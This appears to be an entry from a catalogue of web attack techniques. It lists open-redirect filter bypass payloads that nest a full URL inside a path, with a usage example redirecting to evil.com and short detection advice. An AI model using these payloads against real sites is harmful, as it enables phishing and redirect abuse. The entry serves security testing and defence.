---
id: 77185d22-2c24-4450-a437-50326552d555
type: code
language: url-payload
verified: true
created_at: '2023-04-06T03:56:31.798606+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - path-bypass
validated: true
---

# Nested-Path-URL-Redirect

## Code

```url-payload
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

## Description

Nests full URL in path, evading param-specific filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| yoursite.com/http://theirs | Nested redirect | target.com/http://evil |

## Usage

/redirect?url=http://yoursite.com/http://evil.com.

## Detection

- Scan paths for embedded schemes like http:.
- Normalize URLs before processing.

## Related

- [[procedures/Bypass-Open-URL-Redirection-Filters]]
